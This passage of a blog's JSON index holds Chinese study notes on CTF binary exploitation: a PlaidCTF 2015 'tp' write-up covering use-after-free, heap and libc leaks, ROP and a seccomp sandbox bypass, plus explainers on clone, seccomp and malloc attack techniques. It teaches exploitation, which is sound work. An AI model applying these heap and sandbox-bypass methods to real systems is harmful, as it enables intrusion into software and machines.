也用到了.gcc_except_table section(LSDA) libgcc中实现 https://osdn.jp/projects/drdeamon64/wiki/DWARF%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88 https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-PDA/LSB-PDA/ehframechpt.html https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-PDA/LSB-PDA/ehframechpt.html 也存在单独的寄存器操作指令 call frame信息 CIE就像一个初期状态模板 也有readelf -wF不会显示的信息 是LSDA 可以使用katana http://www.nongnu.org/katana/ katana 相关论文及题目 http://www.cs.dartmouth.edu/~sergey/battleaxe/hackito_2011_oakley_bratus.pdf http://www.cs.dartmouth.edu/~sergey/battleaxe/hackito_2011_oakley_bratus.pdf CodeGate2014 - pwn800 - membership https://www.bpak.org/blog/2014/02/codegate-2014-membership- 800pt-pwnable-write-up/ Hack.lu 2014 - pwn500 - breakout https://github.com/jhector/breakout https://blog.leoc.io/blog/20150223/hacklu2014-breakout/","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"PlaidCTF 2015 - pwnable620(420+200) – tp - stage2","slug":"PlaidCTF-2015-pwnable620-420-200-–-tp-stage2","date":"2019-09-05T06:40:16.000Z","updated":"2019-09-05T06:41:01.499Z","comments":true,"path":"2019/09/05/PlaidCTF-2015-pwnable620-420-200-–-tp-stage2/","link":"","permalink":"https://darkwing.moe/2019/09/05/PlaidCTF-2015-pwnable620-420-200-%E2%80%93-tp-stage2/","excerpt":"","text":"Stage2 sandbox bypass Stage1已经实现了任意代码执行 接下来就是sandbox部分 目标是读取/home/tp/flag2 解析 - 整体构成 亲： fork生成子A alarm handler 在随机位置设置子A的显示 子A： seccomp clone生成子B 作为显示运行 子B： 主程序（note管理类） kernel： seccomp过滤器 子A和子B的内存空间，fd等是公用的，寄存器数据通过pipe交换使用 子B运行system call时，如果被许可才会执行 如果不被许可（必要的额外检查），返回SIGSYG信号，调用SIGSYS handler，向显示传递数据 之后显示上进行过滤器，没问题的话会再次调用system call，这时seccomp过滤器会无条件通过 显示端的过滤条件导致进程强制结束 解析 - sandbox部分 信号handler(SIGALRM)注册 从0x10000000~0x700000000000的范围中，选择两个随机区域，作为g_trusted_code使用的code区域和stack区域 g_trusted_code是子A的独立过滤器（显示端） 通过SIGALRM，10秒后结束 因为随机生成的地址作为g_trusted_code，子A向该地址写入先使用的汇编代码 因此ucontext使用的context的显示端，产生调用寄存器状况，会转送到子A 注册SIGSYS handler 亲级的随机地址是生成给g_trusted_code使用，预先申请所有可能的区域，以便可以在任何地方写入，并通知父级，已经写入完成 子A的内存空间，亲把g_trusted_code的汇编代码写入完成后，通过ucontext来切换 g_trusted_code内执行clone()，线程的一端（子B）返回，子B开始执行do_command 事前准备 依次调用一次那三个函数 显示端(独立过滤器)写入pipe管道后，system call相关寄存器从中读取数据，并执行以下检查： arg_checker() system call是open时，arg1 == /home/tp/flag1的话，OK system call是mmap/mprotect/munmap/brk/mremap的话，OK 其他的NG，之后进程整体强制结束 outside_run_check_and_do_syscall() stack上的返回地址是g_trusted_code范围以外的地址的话，NG OK的话，执行system call NG的话，进程整体强制结束 call_r12_munmap 在已经整体获取到的区域中，释放未使用的区域 生成pipe 变更g_trusted_code的内存权限 call_r13_seccomp 省略前半部分生成filter的过程，这里直接贴出生成后的filter 右下角这一大块是设置filter，filter内容参见左上注释部分 call_r14_clone 作为子A的显示端（独立过滤器） 作为子B的context切换，do_command 清空ucontext使用的context，通过clone()产生子A和子B的分歧，子A：显示端，子B：do_command arg_checker &amp; outside_run_check_and_do_syscall arg_checker() system call是open时，arg1 == /home/tp/flag1的话，OK system call是mmap/mprotect/munmap/brk/mremap的话，OK 其他的NG，之后进程整体强制结束 outside_run_check_and_do_syscall() stack上的返回地址是g_trusted_code范围以外的地址的话，NG OK的话，执行system call NG的话，进程整体强制结束 子A的sighandler 通过seccomp，system call执行失败时（收到SIGSYS），作为sighandler被调用 经过pipe到显示端，然后重新挑战 sandbox类的问题点事实上，这是一个二阶段的sandbox seccomp（kernel过滤器，不可bypass） 显示端 + seccomp 如果1失败，则使用2 在用户空间实施过滤器的seccomp seccomp会对经过这里的调用全部许可（关注点） 因此重点关注seccomp的bypass 关于seccomp的判定 seccomp对二阶段显示端是否通过时如何判定的？ 这个读一下seccomp的过滤器代码就能知道 看一下dump流程 seccomp过滤器只对应一个进程 不是从子B，从子A开始调用的是怎样判定的 在seccomp执行前的int 3断点patch ASLR有效 int 3停止时，$r12是seccomp的过滤器，这里是0x21ee45b14ed0，从这里开始dump到整个内存页结束的内容 arch 检查（是不是x86_64） 检查system call编号 检查RIP(下位32bit，上位32bit，分两次比较，RIP == 0x32b9f368f0b2的话ALLOW) 通常allow的特殊地址： 0x32b9f368f0b2（这个是每次都会变化的） 这时，0x32b9f368f000~是g_trusted_code写入的区域 diff = 0xb2 g_trusted_code + 0xb2（显示端中间） 指向存放ret地址的地方 也就是说，我们要判断g_trusted_code + 0xb0 的syscall是否被调用 总结 二阶段的sandbox 第一阶段不可bypass 第二阶段存在RIP检查 会检查是否是从显示端内的syscall开始的调用 如果是从显示端的syscall发起的调用，则seccomp会全部允许 sandbox问题攻略 在stage1已经实现了任意代码执行 如果能够直接jmp到显示端的syscall，不就可以绕过所有过滤器了吗？ 在子A内，有一个特殊的syscall可以完全通过seccomp 子A和子B共享内存空间，因此可以从子B进行jmp来调用这个syscall 问题点显示端在内存空间的哪里？ 运行时被设置在一个随机地址 地址信息，在内存中也没有残留 也就是说，不能通过内存泄漏来获取 因此，需要某种技术从内存中获取显示端的地址 能够利用的syecall是下面这些： clone, close, exit_group, read, write, rt_sigprocmask, rt_sigreturn mmap, mprotect, munmap, brk, mremap 内存空间大概是这样： 但是，实际上这些区域之间是有空隙的： 攻略idea 以适当的size进行mmap，填充这些空隙 mmap是被允许的syscall 空隙完美填充（后面是连续区域），那么后面就可能是显示端区域 如何确定后面是否是连续区域？ 访问没有mapped的区域时，会发生SIGSEGV，但存在避免SIGSEGV的方法 利用syscall判定 write(fd,buf,count) #read()也可以 mprotect(addr, len, prot) 向write或者mprotect传递位置地址作为参数，检查返回值 如果成功，就能够断定这个地址存在 算法 指定reserved size的一半，调用mmap 不能指定从哪里取得 也有可能得到的不在reserved区域范围内 当然，如果没有能够mmap的空间，会失败 如果失败，size再次减半，重试 如果成功，对后面的地址进行write，判断区域是否存在 区域可能存在，也可能不存在 不存在的情况下，离开现在已经获取到的区域，同样的size重试（第2步） 如果存在，判断它是否是code 开头四个字节是0x41 0xff 0xd4 0x48的话，可以判定是code 如果不是code，离开现在已经获取到的区域，同样的size重试（第2步） 判定成功的话，它是code 之后直接调用code + 0xb0的syscall，会允许所有的syscall open(“/home/tp/flag2”)-&gt;read()-&gt;write() exploit","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"PlaidCTF 2015 - pwnable620(420+200) – tp - stage1","slug":"PlaidCTF-2015-pwnable620-420-200-–-tp-stage1","date":"2019-08-22T07:19:49.000Z","updated":"2019-08-27T09:14:39.954Z","comments":true,"path":"2019/08/22/PlaidCTF-2015-pwnable620-420-200-–-tp-stage1/","link":"","permalink":"https://darkwing.moe/2019/08/22/PlaidCTF-2015-pwnable620-420-200-%E2%80%93-tp-stage1/","excerpt":"","text":"题目信息https://github.com/ctfs/write-ups-2015/blob/master/plaidctf-2015/pwnable/tp/problem_414d338fffb41107a3cf70bd0a7feffe.elf?raw=true 测试运行直接运行什么也不会显示，大概10秒后killed strace$ env -i strace -fi ./tp 省略前面的加载library部分 有一个alarm(10)的时间限制（造成killed的原因） clone，pipe2，prctl， syscall_317(seccomp)之类的，看起来像sandbox的system call。也有一个可疑的SIGSTOP信号 checksec防御全开 vmmap 没有自身的elf 一个非常大的mmap 开启ASLR运行$ gdb -q ./tp -ex &#39;set disable-randomization off&#39; 这次正常了，也就是说，如果关掉ASLR就不能正常运行 Stage1 暂时不需要考虑绕过sandbox sandbox部分在Stage2 这部分主要是pwn 目标是读取/home/tp/flag1 解析 - 整体构成 父进程（sandbox） 子A（sandbox） 子B（main，note管理类） 子B主要5个功能，内部实现是红黑树，node持有指向note的指针，note持有指向data的指针 解析 - 主操作部分do_command 右侧:恢复点 读取command 根据command进行分支 常规的note管理类服务 command0_new 接受要创建的note的size 但不对size进行检查 在没有对size检查的情况下生成新note 搜索已经free的note，如果存在，会再次使用它 build_node_and_insert_note 初始化与node相连的note 搜索能够构建tree的node插入点 初始化要插入tree的node 将node插入tree 在没有检查size的情况下，分配连接到note的buffer new(buffer)如果失败，产生std::bad_alloc异常，调用handler 恢复点 note使用的buffer(data)如果存在，则释放它 note自身也释放 但是data和note还是连接在一起的 这就产生了Use After Free command1_read 接收note的id，以及要读取的size 搜索指定id的note 读取note的data command2_write 接收note的id，以及要写入的size 搜索指定id的note 写入note的data command3_free 接收要变更为不可利用的note的id 搜索指定id的note clear used 比特位 command4_delete 接收要废弃的note的id 搜索指定id的note 释放node和note 攻略(stage1)环境创建tp用户，创建测试flag： 不需要alerm(10),因为有PIE，不能用peda的deactive，直接patch为alerm(0) 之后socat启动服务，因为有ASLR，不能使用gdbserver（禁用ASLR时，二进制的.text段会消失)。所以这次需要使用gdb attach： 终端1启动服务，终端3使用gdb attach，终端2为攻击者发送数据： pgrep -w &lt;filename&gt;可以筛选LWP(包括线程的进程)列表，之后使用tail -1选择最后一个生成的线程，也就是只选择子B。 但是，因为有PIE，每次attach，text的基地址都会改变 根据attach后stack上的各种值，可以计算出PIE的base： 通过vmmap检查PIE的base，这次是0x7fdc7bdcc000 根据stack上的值计算出偏移：0x7fdc7bdce34f - 0x7fdc7bdcc000= 0x234f (diff) *$rsp-0x234f == PIE的base，set $base = *(void**)$rsp-0x234f，即使有PIE，偏移量是不会改变的，因此我们可以通过每次的rsp计算出PIE的base 生成command文件将禁用SIGSYS信号的stop，print，读取heap信息，计算base等命令写到文件里，再次gdb attach： 将程序各个功能封装成函数： 生成dump函数确认UAF之前，准备好dump node和note信息的函数比较好 这样会非常效率 便于理解heap内部情况 可以看到生成了一个存在note，buffer为NULL的异常node Pwn - 生成共有状态利用UAF可以达到任意内存读写 但首先需要生成共用内存的状态 即存在两个指针A和B，指向同一块内存区域 1. _new(size=1) 创建了一个size为1的note，之后tree是这样的 2. _new(size=1) 创建一个后面用于覆盖的元素 作为id为0的node的父node，插入到tree中 3. _new(size=-1) alloc_note内部，首先生成note 接下来准备生成data 但是因为size是负数，data生成失败，malloc内部生成了thread_arena 刚才生成的note被free后，来自node的引用仍然存在 fastbins与这个note相连接，arena切换，这个note已经不能被使用 4. _new(size=-1) 同样，先在alloc_note内部，首先生成note 之后，data生成失败，如果已经存在thread_arena，malloc就不会再创建新的arena 因为data生成失败，data被free，来自node的引用仍然存在 bins和note相连接 5. _free(id=1) tree开头的节点，id=1的note设置为used=0 如果存在used=0的note，它的size与指定的size不一致，下次alloc_note时，先free(data)，然后重新分配一次 6. _new(size=0x28) 因为used=0的note的id=1，它将被再次使用 但是size不一致，会先将id=1的datafree掉 之后的malloc，会从thread_arena生成data 因为bins中存在sz=0x28的chunk，会直接再次使用，作为id=1的data 这时候，id=1的data和id=3的data是共有状态 但是，id=3的note，实际上id信息已经破坏，因此需要修正 Pwn - heap leak生成了共有状态 接下来，对id=1的data的变更操作，也会对id=3的note的data操作 可以做任意读写 如果可以指定GOT地址进行读取，就不需要考虑libc相关地址 也就是说，无视ASLR 但是因为这里同时有PIE+ASLR，我们不知道GOT(.text)的地址 可以利用Partial Overwrite，来leak内存 首先需要泄漏heap的地址（thread_arena的mapped区域） 7. _read(id=1, data=pQ(0x1337)) 更新id=1的data 这会导致id=3的note更新，变成id=0x1337 这时，id=0x1337变成used=0 8. _new(size=0x100) 因为找到的used=0的note的id=0x1337，通过alloc_note对这个note再次使用 id=0x1337，生成data size=0x100，不在bins里的小的size就可以 这时，id=0x1337的note上，生成了指向data的指针 这个指向data的指针，指向的是从thread_arena的mapped区域申请的chunk 9. _read(id=1, data=pQ(0x1337) + “\\x70\\x08”) 使用id=1，来覆盖指向id=0x1337的note的data的指针，只能写两个字节 指向0x1337的data的指针，指向的是thread_arena内部的bin上的一个chunk 可以看到，指向data的指针，后两个字节已经被重写 这次是指向mapped+0x870作为data 里面是mapped+0x858 10. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏mapped+0x858之类的值 泄漏的值减去0x858就能够知道heap的base地址 Pwn - libc leak 能够泄漏heap的base地址 附近(mapped+0x888)存在和libc相关的地址 从thread_arena到main_arena的next指针 这个也可以被泄漏 11. _read(id=1, data=pQ(0x1337) + “\\x88\\x08”) 使用id=1，来覆盖指向id=0x1337的note的data的指针，只能写两个字节 指向0x1337的data的指针，指向的是thread_arena的next next中是main_arena的地址 12. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏main_arena的地址 泄漏的值减去0x3be760就能够知道libc的base地址 Pwn - stack leak 能够泄漏libc的base地址 结合偏移量就能够计算出libc中各种函数地址 但计算出system函数并不能结束 因为有sandbox，system，execve之类的不能使用 但是heap操作必要的，mprotect/mmap这类是被允许的 最快的方法是，通过mprotect使heap权限为RWX，然后在heap中加载执行open()-&gt;read()-&gt;write()这样的shellcode 因此，策略是覆盖stack返回地址，执行mprotect()-&gt;read()这样的ROP 13. _read(id=1, data=pQ(0x1337)+pQ(libc_base+0x3c14a0)) libc中存在指向stack的__environ，__libc_stack_end变量 这里是将id=0x1337的note的data变更为__environ,也就是libc_base + 0x3c14a0 14. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏stack上envp[]的地址 泄漏的值减去0x200就是储存read()函数返回地址的地方 Pwn - stack伪造15. _read(id=1, data=pQ(0x1337)+pQ(ret)+pQ(len(rop))) 让id=0x1337的note指向ret 16. _read(id=0x1337, data=rop) 之后在ret附近写入ROP stage1的exploit","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"thread clone","slug":"thread-clone","date":"2019-08-14T05:45:42.000Z","updated":"2019-08-14T05:46:24.265Z","comments":true,"path":"2019/08/14/thread-clone/","link":"","permalink":"https://darkwing.moe/2019/08/14/thread-clone/","excerpt":"","text":"clone 能够生成线程的system call 适用于sandbox，出现频率非常高 clone(2)和clone(3)有区别，这里使用clone(3)进行说明 https://linuxjm.osdn.jp/html/LDP_man-pages/man2/clone.2.html 生成的子进程可以通过fn()恢复 生成的子进程，使用child_stack作为stack 因为使用父进程相同的stack会产生corrupt flags可以指定各种，sandbox问题中这些比较多： CLONE_THREAD：与父进程相同的线程组（线程必须） CLONE_SIGHAND：与父进程共享信号处理程序表（线程必须） CLONE_FILES：与父进程共享文件目录 CLONE_FS：与父进程共享文件系统信息 CLONE_VM：与父进程共享内存空间（线程必须） 特别是CLONE_VM，重要与父进程共享内存空间 没有CLONE_VM的情况，内存空间是复制后独立的 指定CLONE_VM的情况，共享内存空间 CLONE_FILES也很常见与父进程共享文件目录 没有指定CLONE_FILES的情况，fd是复制后独立的 指定CLONE_FILES的情况，共享文件目录fd clone与seccompclone(flags=CLONE_VM|…)和seccomp()很适合结合使用 两者结合的sandbox题目频出 子进程实行seccomp，后续的system call会受到内核级别的全局限制 但是如果想要执行特定的system call，需要首先通过子进程的过滤器。通过校验后，对system call进行”代理实行”处理(也存在子进程没有独立过滤器的情况) 通过预先创建的pipe管道，将寄存器及内存信息传递给父进程，代理实行 父进程通过使用对pipe管道的写入监视等来处理子进程的system call请求 通信数据通过父进程的过滤器，实行实际的system call(也存在父进程没有独立过滤器的情况) 即使子进程实行了seccomp，也与父进程无关，父进程可以自由的进行system call 因为内存空间和fd是共享的，某些system call的结果会反映在子进程中。(例如通过mmap生成新的内存区域会反映在子进程中，通过open打开文件，那么子进程也可以使用该fd) 因此可能会有非预期解法，导致子进程执行某些system call 这种类型的题目考点是“如何绕过独立过滤器” seccomp基本不可绕过 绕过对象可以是子进程的独立过滤器，也可以是父进程的 没有CLONE_VM的模式存在clone(flags=CLONE_VM|…)这样不使用CLONE_VM的模式 除了使用下面这样的pipe管道进行数据交换外，还使用ptrace， process_vm_readv，process_vm_writev等 常见模式常见模式1(有无CLONE_VM皆可) 自己独立过滤器的参数检查比较容易bypass 检查范围的溢出，index溢出，特殊字符，竞争等 常见模式2(有无CLONE_VM皆可) 首先子进程能够执行任意代码 stack BOF，heap BOF，FSB，UAF，TypeConfusion，Race等 自己独立过滤器隐含假设条件被打破，进行调用 system call参数，调用源，调用计数，上下文 常见模式3(有CLONE_VM) 利用子进程中的漏洞，创建read/write原语(一系列任意内存读写的输入) 重复内存泄漏，使ASLR无效 因为内存由CLONE_VM共享，因此父进程使用的内存被重写，就能够禁用或者绕过父进程的独立过滤器 常见模式4(无CLONE_VM) 子进程可以执行任意代码 从子进程向父进程发送意外数据，利用父进程的漏洞 造成父进程的任意代码执行 类似模式1和2，禁用父进程的独立过滤器 clone总结 CLONE_VM，CLONE_FILES比较多 皆在通过创建特殊的进程来构造sandbox问题 sandbox问题很常见","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"seccomp","slug":"seccomp","date":"2019-08-08T03:13:58.000Z","updated":"2019-08-08T03:14:38.686Z","comments":true,"path":"2019/08/08/seccomp/","link":"","permalink":"https://darkwing.moe/2019/08/08/seccomp/","excerpt":"","text":"seccomp sandbox的典型 内核层面过滤system call 只要过滤器正确注册，就无法从用户进程绕过 这个sandbox非常强，还会结合其他的过滤器作为辅助，以防止意外的解决方案 尽量使用复杂的过滤器 也存在一部分过滤器存在漏洞的题目 只过滤自己的进程，不会影响其他进程 使用seccomp(2) 或者 prctl(2)来注册过滤器 这是一种通过库函数调用的方式，稍微有点复杂 使用seccomp的流程 进程发布seccomp（后面所说的prctl） 在内核中创建过滤器，之后每次执行system call都会经过过滤器验证 该过滤器适用于这个进程的每个线程，一旦注册，在该进程结束之前就不能进行修改或者删除。 如果允许prctl，则可以添加更多过滤器。如果允许fork，则子进程继承过滤器。如果允许execve，则在execve前后过滤器保持不变。 如果是允许的system call，则内核执行 如果是不允许的system call，则根据过滤器设置进行操作 不要直接结束进程，向进程发送SIGSYS信号（无效参数）,返回错误代码，然后继续 seccomp的调用方法有多种方法可以调用，有点复杂 seccomp.h的库函数 prctl(2) seccomp(2) seccomp.h的库函数 直接使用seccomp.h中定义的库函数 最简单的调用方式 不需要了解BPF seccomp在内部实现了调用BPF(Berkeley Packet Filter)的虚拟机 封装之后，使用者不需要去了解BPF命令 只需要设置system call编号，参数检查等 自动检查平台架构 prctl(PR_SET_NO_NEW_PRIVS, …)也自动进行 无法进行EIP/RIP 基本上是这4个 scmp_filter_ctx seccomp_init(uint32_t def_action) int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, …) int seccomp_load(scmp_filter_ctx ctx) void seccomp_release(scmp_filter_ctx ctx) 函数定义参考这里： http://man7.org/linux/man-pages/man3/seccomp_init.3.html http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html http://man7.org/linux/man-pages/man3/seccomp_load.3.html http://man7.org/linux/man-pages/man3/seccomp_release.3.html 代码示例 SCMP_ACT_KILL: 从内核收到SIGSYS，进程推出 SCMP_ACT_ALLOW: 执行system call SCMP_ACT_TRAP: 自身发出SIGSYS SCMP_ACT_ERRNO(x): 返回错误代码 SCMP_ACT_TRACE: 由ptrace控制时发出(SIGTRAP | (PTRACE_EVENT_SECCOMP&lt;&lt;8)) 简单使用的话啊就只检查system call编号和参数是否正确 此次生成的内部BPF指令如下： 测试运行，如果禁掉了read，会得到下面的结果： prctl(2) 使用prctl定义的PR_SET_SECCOMP 存在两种模式 静态模式 用户不需要编写过滤器 静态模式只有通用的过滤器，放行read, write, exit, sigreturn 很少用于CTF 过滤模式 自己编写并注册过滤器 可以在过滤器中检查EIP/RIP 如果需要在调用system call的时候检查EIP/RIP，则不能使用seccomp.h的库函数 使用seccomp_data.instruction_pointer 但是，过滤器结构很复杂 所有BPF命令都需要自己写 平台架构的检查，system call编号及参数的检查，全都需要使用者自己编写 基本流程如下： 创建一个sock_filter结构体数组 在这里写BPF命令 从sock_filter结构体数组及其大小创建sock_fprog结构体 prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); 如果没有这个，在第四步允许execve()的话，如果执行suid二进制文件，则uid可能改变，如果不重置该功能，可能存在各种漏洞。所以还是指定比较好。 prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog, 0, 0); 参考： https://linuxjm.osdn.jp/html/LDP_man-pages/man2/prctl.2.html http://www.tiger1997.jp/report/activity/securityreport_20131211.html http://www.tiger1997.jp/report/activity/securityreport_20131227.html FreeBSD的数据包过滤器，同呀昂存在BPF，作为参考： http://www.gsp.com/cgi-bin/man.cgi?topic=bpf http://www.yosbits.com/opensonar/rest/man/freebsd/man/ja/man4/bpf.4.html Linux中的编程示例： http://man7.org/tlpi/code/online/dist/seccomp/ 代码示例 seccomp过滤器注册后，调用system call，每次都会向内核传递这样的结构体 平台架构检查是必须的。如果不存在此检查，则可能通过将执行上下文从x86切换到x64来跳过system call编号检查 system call编号由BPF命令检查 向隐式累加器A(seccomp虚拟机的32位运算寄存器)使用seccomp_data-&gt;nr作为四个字节(BPF_W|BPF_ABS)进行加载(BPF_LD) 比较(BPF_JEQ)A与立即值(BPF_K)的__NR_XXX，根据结果产生分支(BPF_JMP) 返回(BPF_RET)立即值(BPF_K) 测试运行，如果禁掉了read，会得到下面的结果： 分析seccomp二进制文件的小技巧： 假设是prctl(2)方式的seccomp 制作BPF过滤器 但是，创建BPF过滤器时的命令逐条解析很麻烦 检查BPF过滤器的内容 使用gdb，到prctl(PR_SET_SECCOMP, …)之前 使用gdb-peda的dumpmem，dump BPF过滤器的内存范围 gdb-peda$ dumpmem /tmp/out.dmp 0xffffaaaabb00 0xffffaaaabc00 反编译dump出得BPF过滤器 $ disas-seccomp-filter /tmp/out.dmp 这样不需要知道构建过滤器过程，只需要知道最终的过滤器 seccomp(2)prctl(2)的向上兼容 使用方法与prctl(2)基本相同 但是，glibc中没有seccomp的包装函数 glibc的syscall()可以直接指定system call编号进行调用 long syscall(long number, ...); 大概是这样的流程 创建一个sock_filter结构体数组 从sock_filter结构体数组及其大小创建sock_fprog结构体 prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &amp;prog) 与prctl(2)不同的只有第四步 可以使用SECCOMP_FILTER_FLAG_TSYNC标志来添加过滤器 添加过滤器时，请注意将同一过滤器添加到其他线程 如果存在无法添加的线程，则返回线程ID syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, &amp;prog) 函数定义参考这里： http://man7.org/linux/man-pages/man2/seccomp.2.html 代码示例因为库中不存在seccomp(2)，这里使用syscall()： 这里很容易出错，（虽然它是相同的过滤模式，prctl为2，seccomp为1） 总结 seccomp.h的库函数 简单 prctl(2) 存在静态模式，过滤模式两种 可以检查EIP/RIP seccomp(2) prctl(2)的向上兼容 glibc中没有库，通过syscall()调用 存在同时向所有线程追加的选项","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF中的sandbox","slug":"CTF中的sandbox","date":"2019-08-01T04:57:33.000Z","updated":"2019-08-01T04:58:10.395Z","comments":true,"path":"2019/08/01/CTF中的sandbox/","link":"","permalink":"https://darkwing.moe/2019/08/01/CTF%E4%B8%AD%E7%9A%84sandbox/","excerpt":"","text":"sandbox问题分类大体上两类 1.binary的sandbox 绕过system call过滤机制 自定义过滤器，seccomp过滤器，混合过滤器等 基本上结合pwn问题 2.program的sandbox 绕过对函数，变量，语法，字符等的过滤机制 不能使用符号，import之类语句等 python/php很常见，其他的go/JavaScript/ruby之类 大部分是misc类，也有pwn和web PWN相关问题会有最新的CVE Web问题与web服务一起发布 sandbox问题特征 即使控制了EIP/RIP，也不能调用execve()之类的危险system call system()内部也是execve()，无法调用 大多数system call都不能使用 这取决于过滤了哪些 实现实现大体上有三种方式 进程自身过滤 限制system call的调用地点和流程 实现方式最简单，也很容易绕过 父进程过滤 pipe ptrace process_vm_readv，process_vm_writev 使用clone内存共享等来过滤传输系统调用代码参数 实现比较复杂，CTF中比较多 内核过滤 seccomp 很强大，几乎不可绕过，问题实例较少，结合1和2时有很多问题 问题构成普通pwn问题构成 控制EIP/RIP后，执行system(“sh”)就可以 或者创建一个RWX区域执行shellcode sandbox问题构成 单纯控制EIP/RIP，并不能结束工作 调用禁止的system call的话，进程会停止(pwn失败) 因为sandbox过滤了execve()，所以无法获得shell 构成模式 在前段进行pwn，控制EIP/RIP后绕过sandbox过滤的模式 前段没有pwn，直接执行任意代码的模式 攻略方法 了解system call过滤处理 自定义过滤器，seccomp过滤器，混合过滤器等 在system call过滤处理中找到漏洞 CTF题目中一定存在漏洞 绕过sandbox经常需要复杂的流程 首先，需要某种方式的”任意代码执行”，这里指的是发送的任意汇编代码可以像shellcode一样执行。(因为不能打开shell 创建RWX区域执行任意代码 RWX区域可以通过mmap/mprotect来生成，如果二进制本身没有NX就太好了 绕过之后通常是open(flag) -&gt; read() -&gt; write()，因为不能使用execve 如果不能使用mmap/mprotect，那么ROP","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记23:heap与malloc(-1)","slug":"Pwn学习笔记23-heap与malloc-1","date":"2019-07-18T08:34:19.000Z","updated":"2019-07-18T08:39:48.752Z","comments":true,"path":"2019/07/18/Pwn学习笔记23-heap与malloc-1/","link":"","permalink":"https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/","excerpt":"","text":"PlaidCTF 2015 - pwnable620(420+200) - tp Use After Free + sandbox逃逸 主要三个点 heap thread arena sandbox seccomp thread clone 扩展部分并不是解题必须的，但因为相关资料较少，作为补充内容 heapThe Malloc Maleficarum 有点老（x86, glibc-2.3.5），使用malloc/free进行exploit的5种技术 https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt 除了House of Prime之外其他四种仍然有效 这里的环境是glibc-2.20 House of Lore https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/ House of Mind https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/ House of Force https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/ House of Spirit https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/ The Malloc Maleficarum简单解说 House of Lore consolidate之后对smallbins/largebins的unlink attack。将free状态的chunk的bk修改为任意地址，之后第一次malloc到free_list的开头，第二次malloc则是我们控制的地址。尽管在unlink时已有检查机制，但是如果是相互正确引用的chunk，free状态chunk的bk指向它的话是有效的。另外，在fast bins的link list获取不检查fd/bk的size非常简单。这就是fastbins attack，本质上是House of Lore的一种 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/ House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。 House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。 House of Mind 构造一个设置了NON_MAIN_ARENA比特位的chunk进行free的攻击。查找chunk所属arena的计算是(p&amp;0xfff00000)-&gt;ar_ptr，在p&amp;0xfff00000构造伪造的heap_info和arena，将伪造的heap_info-&gt;ar_ptr指向伪造的arena，在伪造的arena-&gt;bin[0]中设置GOT-8之类的。NON_MAIN_ARENA的chunk在free时，free的chunk连接到那个GOT，造成GOt被修改。目前已被修改，unlink时加入了(对unsorted_chunks是fwd-&gt;bk != bck)验证，但是对fastbins仍然有效 House of Force 将top chunk(heap最后的chunk的下一个)的size修改为0xffffffff的一种攻击。之后，malloc(攻击者指定的大小)，可以获取到非常大的内存。对内存空间遍历一次，top chunk可以到达heap之前的bss，下一次malloc就可能获取到GOT。这种方式现在仍然有效 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/ House of Spirit 